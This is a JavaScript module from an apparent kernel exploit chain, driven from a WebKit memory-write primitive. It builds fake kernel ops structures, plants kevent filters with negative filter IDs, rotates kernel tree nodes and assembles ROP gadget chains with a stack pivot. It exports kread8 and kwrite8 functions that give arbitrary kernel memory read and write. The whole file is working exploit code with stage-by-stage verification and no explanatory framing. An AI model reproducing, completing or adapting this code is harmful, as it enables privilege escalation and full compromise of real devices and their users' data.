import { hxBridge } from "./hx_kevent.js";

// Stages 3-6: fakeops build + plant + rotations + kread/kwrite via the -23 ring-0 door.
// Page writes use the WebKit primitive (p) — the MAP_FIXED page is not a JS ArrayBuffer.
const b = hxBridge();
const P = b.P;
const ka = (rva) => b.ka(Number(rva));

const GIDENT = 0x31344b5052544f4fn;   // "OORTPK41"
const MAGIC  = 0x4d4d524f4f544a31n;

const G = { PRAX:21, PRDX:22, PRDI:23, SAVE:18, REST:19, CONT:20,
            LDRAX:26, ADDRAX:27, STRAXRDX:28, STRDIRAX:29, POPRSP:17,
            RET0:15, TOUCH:16, SLOT:13 };
const gad = (i) => ka(P[i]);

function I(v) { v = BigInt(v); return new b.int64(Number(v & 0xffffffffn) >>> 0, Number((v >> 32n) & 0xffffffffn) >>> 0); }
const pw8 = (a, v) => b.p.write8(I(a), I(v));
const pw4 = (a, v) => b.p.write4(I(a), v >>> 0);
const pw2 = (a, v) => b.p.write2(I(a), v & 0xffff);
const pw1 = (a, v) => b.p.write1(I(a), v & 0xff);
const pr8 = (a) => { const r = b.p.read8(I(a)); return (BigInt(r.hi >>> 0) << 32n) | BigInt(r.low >>> 0); };
const pr4 = (a) => b.p.read4(I(a)) >>> 0;

let PAGE = 0n, rootKq = -1;
export function bindPage(page) { PAGE = page; }

function node(off, v1, v2, v3, i10, l11) {
  pw8(off, v1); pw8(off + 8n, v2); pw8(off + 16n, v3);
  pw4(off + 24n, i10 >>> 0); pw4(off + 32n, l11 | 0);
  pw1(off + 36n, 1); pw1(off + 37n, 1);
}
function rotKevent(arg1, targetFd, armClAddr, label) {
  // verbatim from bytecode: ac(u, l69, targetFd, 0, 72, armCl, 12, 0)
  const rc = b.scn("kevent", arg1, targetFd, 0, 72, armClAddr, 12);
  b.log(label, "rc=" + rc);
  return rc === 0;
}

// stage 3: fill fakeops page + plant (probe pc 7352-7716)
export function stage3(kva) {
  pw1(16, 239); pw1(17, 255); pw1(18, 255); pw1(19, 249);       // 239.255.255.249
  pw8(24, PAGE + 0x200n);
  pw8(32, PAGE + 0x300n);
  pw4(0x280, 8);
  pw8(0x320, PAGE + 0x400n);
  pw8(0x758, PAGE + 0x800n);
  pw8(0x808, PAGE + 0x900n);
  pw4(56, 2);
  pw8(80, 0n); pw8(88, 0n);
  pw2(180, 2); pw2(190, 2);

  const cl = b.allocBuf(64);
  b.zeroBuf(cl);
  cl.dv.setUint32(0, Number(BigInt(kva) & 0xffffffffn), true);
  cl.dv.setUint16(8, 0xffee, true);   // -18
  cl.dv.setUint16(10, 1, true);       // EV_ADD
  cl.dv.setUint32(16, 0, true);       // data=0
  const rc = b.scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
  b.log("STAGE3-PLANT", "rc=" + rc);
  if (rc !== 0) b.fin("stage3 plant failed rc=" + rc);

  const kva2 = pr8(PAGE + 80n);
  const canary = pr4(PAGE + 56n);
  const ok = canary === 2 && (kva2 >> 32n) >= 0xffffn;
  b.log("STAGE3-VERIFY", "kptr=" + b.h16(kva2) + " canary=" + canary + (ok ? " KVA-OK" : " MISMATCH"));
  if (!ok) b.fin("stage3 verify failed");
  return kva2;
}

// stage 4: node trios + rotations (probe pc 7993-8915)
export function stage4(kva2, targetFd) {
  const armCl = b.allocBuf(64);
  // trio 1
  node(PAGE + 0xa00n, PAGE + 0xa80n, 0n, 0n, 0, -1);
  node(PAGE + 0xa80n, 0n, PAGE + 0xb00n, PAGE + 0xa00n, 1, -2);
  node(PAGE + 0xb00n, 0n, 0n, PAGE + 0xa80n, 0, -3);
  pw8(PAGE + 80n, PAGE + 0xa00n); pw4(PAGE + 88n, 3);
  b.zeroBuf(armCl); armCl.dv.setUint8(7, 2);
  if (!rotKevent(rootKq, targetFd, armCl.addr, "STAGE4-ROT1")) b.fin("rotate1 failed");

  // trio 2
  node(PAGE + 0x900n, PAGE + 0xc00n, PAGE + 0xd00n, ka(P[G.SLOT]) - 8n, 0, -1);
  node(PAGE + 0xc00n, 0n, 0n, PAGE + 0x900n, 1, -2);
  node(PAGE + 0xd00n, 0n, 0n, 0n, 0, -3);
  pw8(PAGE + 80n, PAGE + 0x900n); pw4(PAGE + 88n, 3);
  b.zeroBuf(armCl); armCl.dv.setUint8(7, 3);
  if (!rotKevent(rootKq, targetFd, armCl.addr, "STAGE4-ROT2")) b.fin("rotate2 failed");

  const gparent = pr8(PAGE + 0xc00n);
  b.log("STAGE4-GPARENT", "kptr=" + b.h16(gparent));
  pw8(PAGE + 0xc00n, 0n);
  pw8(PAGE + 0xc08n, gad(G.RET0));
  pw8(PAGE + 0xc10n, gad(G.RET0));
  pw8(PAGE + 0xc18n, gad(G.RET0));
  pw8(PAGE + 0xc20n, gad(G.TOUCH));
  const ok = pr8(PAGE + 0xc00n) === 0n && pr8(PAGE + 0xc08n) === gad(G.RET0) && pr8(PAGE + 0xc20n) === gad(G.TOUCH);
  b.log("STAGE4-FAKEOPS", ok ? "OK" : "READBACK-FAIL");
  if (!ok) b.fin("fakeOps readback failed");
}

// stage 5/6: root kq arm + kread/kwrite
export function armRootKq() {
  rootKq = b.scn("kqueue");
  if (rootKq < 0) b.fin("root kqueue failed");
  const cl = b.allocBuf(64);
  b.zeroBuf(cl);
  cl.dv.setBigUint64(0, GIDENT, true);
  cl.dv.setUint16(8, 0xffe9, true);   // -23
  cl.dv.setUint16(10, 1, true);       // EV_ADD
  const rc = b.scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
  b.log("ARM", "rootKq=" + rootKq + " rc=" + rc);
  return rootKq;
}

// arena: STACK page+0x1000, RES page+0x1600, MARK page+0x1680, CTX page+0x1700
function c8(idx, val) { pw8(PAGE + 0x1000n + BigInt(idx) * 8n, val); return idx + 1; }
function kb0c(idx) { idx = c8(idx, gad(G.PRDI)); idx = c8(idx, PAGE + 0x1700n); idx = c8(idx, gad(G.SAVE)); return idx; }
function kb1c(idx) {
  idx = c8(idx, gad(G.PRAX)); idx = c8(idx, MAGIC);
  idx = c8(idx, gad(G.PRDI)); idx = c8(idx, PAGE + 0x1680n); idx = c8(idx, gad(G.STRDIRAX)); idx = c8(idx, 0);
  idx = c8(idx, gad(G.PRAX)); idx = c8(idx, PAGE + 0x1700n + 16n); idx = c8(idx, gad(G.LDRAX)); idx = c8(idx, 0);
  idx = c8(idx, gad(G.PRDX)); idx = c8(idx, -120n); idx = c8(idx, gad(G.ADDRAX)); idx = c8(idx, 0);
  idx = c8(idx, gad(G.PRDI)); idx = c8(idx, PAGE + 0x1700n + 8n); idx = c8(idx, gad(G.STRDIRAX)); idx = c8(idx, 0);
  idx = c8(idx, gad(G.PRAX)); idx = c8(idx, gad(G.CONT));
  idx = c8(idx, gad(G.PRDI)); idx = c8(idx, PAGE + 0x1700n); idx = c8(idx, gad(G.STRDIRAX)); idx = c8(idx, 0);
  idx = c8(idx, gad(G.PRDI)); idx = c8(idx, PAGE + 0x1700n); idx = c8(idx, gad(G.REST)); return idx;
}
function kgo() {
  pw8(PAGE + 0x1680n, 0n);
  const cl = b.allocBuf(64);
  b.zeroBuf(cl);
  cl.dv.setBigUint64(0, GIDENT, true);
  cl.dv.setUint16(8, 0xffe9, true);
  cl.dv.setUint16(10, 1, true);
  cl.dv.setBigUint64(32, gad(G.POPRSP), true);
  cl.dv.setBigUint64(40, PAGE + 0x1000n, true);
  const rc = b.scn("kevent", rootKq, cl.addr, 2, 0, 0, 0);
  const ok = pr8(PAGE + 0x1680n) === MAGIC;
  b.log("KGO", "rc=" + rc + " marker=" + (ok ? "OK" : "MISS"));
  return ok;
}
export function kread8(kaddr) {
  let i = kb0c(0);
  i = c8(i, gad(G.PRAX)); i = c8(i, kaddr); i = c8(i, gad(G.LDRAX)); i = c8(i, 0);
  i = c8(i, gad(G.PRDI)); i = c8(i, PAGE + 0x1600n); i = c8(i, gad(G.STRDIRAX)); i = c8(i, 0);
  kb1c(i);
  if (!kgo()) b.fin("kread marker miss @ " + b.h16(kaddr));
  return pr8(PAGE + 0x1600n);
}
export function kwrite8(kaddr, val) {
  let i = kb0c(0);
  i = c8(i, gad(G.PRAX)); i = c8(i, kaddr);
  i = c8(i, gad(G.PRDX)); i = c8(i, val); i = c8(i, gad(G.STRAXRDX)); i = c8(i, 0);
  kb1c(i);
  if (!kgo()) b.fin("kwrite marker miss @ " + b.h16(kaddr));
}
